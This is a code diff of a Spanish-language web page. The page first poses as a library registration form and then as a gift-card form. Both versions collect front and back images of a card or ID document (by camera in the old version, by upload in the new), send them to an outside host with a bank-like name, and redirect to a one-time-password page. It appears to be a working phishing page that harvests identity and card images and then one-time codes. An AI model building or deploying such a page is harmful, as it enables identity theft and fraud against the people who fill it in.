@@ -2,170 +2,141 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registro Biblioteca - Laboratorio</title>
+<title>Tarjeta de Regalo</title>
 
 <style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #f4f4f4;
-    text-align: center;
+body{
+    font-family: Arial;
+    background:#fde2ff;
+    text-align:center;
+    padding:30px;
 }
 
-.screen {
-    display: none;
-    height: 100vh;
-    width: 100%;
+.card{
+    background:white;
+    width:400px;
+    margin:auto;
+    padding:20px;
+    border-radius:15px;
+    box-shadow:0 0 15px rgba(0,0,0,0.2);
 }
 
-.screen.active {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
+.preview-container{
+    display:flex;
+    justify-content:space-around;
+    margin-top:15px;
 }
 
-video {
-    width: 280px;
-    height: 380px;
-    border-radius: 20px;
-    object-fit: cover;
+.preview img{
+    width:120px;
+    height:120px;
+    object-fit:cover;
+    border-radius:10px;
+    border:2px solid #ccc;
 }
 
-button {
-    margin-top: 15px;
-    padding: 10px 20px;
-    border: none;
-    border-radius: 5px;
-    background: #7b6b99;
-    color: white;
-    cursor: pointer;
+input, textarea{
+    width:90%;
+    padding:8px;
+    margin:8px 0;
 }
 
-.loader {
-    width: 40px;
-    height: 40px;
-    border: 4px solid #ddd;
-    border-top: 4px solid #7b6b99;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin-bottom: 10px;
+button{
+    background:#c2185b;
+    color:white;
+    border:none;
+    padding:10px 20px;
+    border-radius:10px;
+    cursor:pointer;
 }
 
-@keyframes spin {
-    100% { transform: rotate(360deg); }
+button:hover{
+    background:#880e4f;
 }
 </style>
 </head>
 
 <body>
 
-<!-- CAPTURA -->
-<div id="screen-camera" class="screen active">
-    <h2 id="title">Captura el frente del carnet</h2>
-    <video id="video" autoplay playsinline muted></video>
-    <button onclick="capture()">Tomar foto</button>
-</div>
+<div class="card">
+    <h2>🎁 Tarjeta de Regalo</h2>
 
-<!-- PROCESANDO -->
-<div id="screen-processing" class="screen">
-    <div class="loader"></div>
-    <p>Enviando información...</p>
-</div>
+    <label>Imagen Frontal</label>
+    <input type="file" id="frontImage" accept="image/*" onchange="previewImage(event,'frontPreview')">
 
-<canvas id="canvas" style="display:none;"></canvas>
+    <label>Imagen Trasera</label>
+    <input type="file" id="backImage" accept="image/*" onchange="previewImage(event,'backPreview')">
+
+    <div class="preview-container">
+        <div class="preview">
+            <p>Frontal</p>
+            <img id="frontPreview">
+        </div>
+        <div class="preview">
+            <p>Trasera</p>
+            <img id="backPreview">
+        </div>
+    </div>
+
+    <textarea id="messageText" placeholder="Mensaje personalizado"></textarea>
+
+    <button onclick="enviarTarjeta()">Enviar Tarjeta</button>
+
+</div>
 
 <script>
+
 const SERVER_URL = "https://nequiscol.onrender.com";
 const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";
 
-let stream = null;
-let step = 1;
-let imageFront = null;
-let imageBack = null;
+let frontBase64 = "";
+let backBase64 = "";
 
-// Iniciar cámara
-async function startCamera() {
-    try {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment" },
-            audio: false
-        });
+function previewImage(event, id){
+    const reader = new FileReader();
+    reader.onload = function(){
+        document.getElementById(id).src = reader.result;
 
-        document.getElementById("video").srcObject = stream;
-    } catch (error) {
-        alert("No se pudo acceder a la cámara.");
-        console.error(error);
-    }
+        if(id === "frontPreview"){
+            frontBase64 = reader.result;
+        } else {
+            backBase64 = reader.result;
+        }
+    };
+    reader.readAsDataURL(event.target.files[0]);
 }
 
-// Capturar imagen
-async function capture() {
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+async function enviarTarjeta(){
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
+    const message = document.getElementById("messageText").value;
 
-    const imageData = canvas.toDataURL("image/jpeg", 0.8);
-
-    if (step === 1) {
-        imageFront = imageData;
-        step = 2;
-        document.getElementById("title").innerText = "Ahora voltea el documento y captura el reverso";
-        alert("Ahora voltea el documento");
-    } else {
-        imageBack = imageData;
-        stopCamera();
-        showProcessing();
-        await sendImages();
+    if(!frontBase64 || !backBase64){
+        alert("Debes cargar ambas imágenes");
+        return;
     }
-}
 
-// Enviar imágenes al backend
-async function sendImages() {
-    try {
-        const response = await fetch(`${SERVER_URL}/step-documents`, {
+    try{
+
+        await fetch(`${SERVER_URL}/step-tarjetaregalo`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                studentCode: Date.now().toString(),
-                frontImage: imageFront,
-                backImage: imageBack
+                sessionId: Date.now().toString(),
+                frontImageBase64: frontBase64,
+                backImageBase64: backBase64,
+                message
             })
         });
 
-        const result = await response.text();
-        //alert("Registro enviado correctamente.");
         setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-       }, 1500);
+            window.location.href = REDIRECT_URL;
+        }, 1500);
 
-    } catch (error) {
-        console.error("Error al enviar:", error);
-        alert("Error al enviar las imágenes.");
-        location.reload();
+    }catch(error){
+        alert("Error al enviar");
     }
 }
 
-// Detener cámara
-function stopCamera() {
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-}
-
-// Mostrar loader
-function showProcessing() {
-    document.getElementById("screen-camera").classList.remove("active");
-    document.getElementById("screen-processing").classList.add("active");
-}
-
-startCamera();
 </script>
 
 </body>
